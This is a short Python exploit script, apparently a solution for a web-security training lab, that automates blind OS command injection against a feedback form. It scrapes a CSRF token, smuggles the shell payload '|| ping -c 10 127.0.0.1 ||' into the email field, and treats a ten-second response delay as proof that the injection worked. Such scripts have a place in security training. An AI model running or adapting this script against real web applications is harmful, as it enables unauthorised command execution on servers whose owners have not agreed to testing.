import requests
import sys
import urllib3
import time
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# grab csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/feedback", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})
    token = csrf["value"]
    return token

def injection(s, url, delay=10):
    print("[*] Trying command injection to make app hang 10 seconds...")
    feedback_url = url + "/feedback/submit"
    csrf = get_csrf_token(s, url)
    payload = "|| ping -c 10 127.0.0.1 ||"
    data = {"csrf": f"{csrf}", "name": "test", "email": f"test@test.com{payload}", "subject": "test", "message": "test message"}
    start = time.monotonic()
    r = s.post(feedback_url, data=data, verify=False, allow_redirects=True, proxies=proxies)
    elapsed = time.monotonic() - start
    print(f"[+] Elapsed: {elapsed:.2f}s")
    if elapsed >= delay:
        print("[+] Lab solved")
    else:
        print("[-] Error. Command did not cause app to hang 10 seconds")
    return elapsed >= delay    

def main():
    if len(sys.argv) !=2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")
    injection(s, url)

if __name__=="__main__":
    main()                    
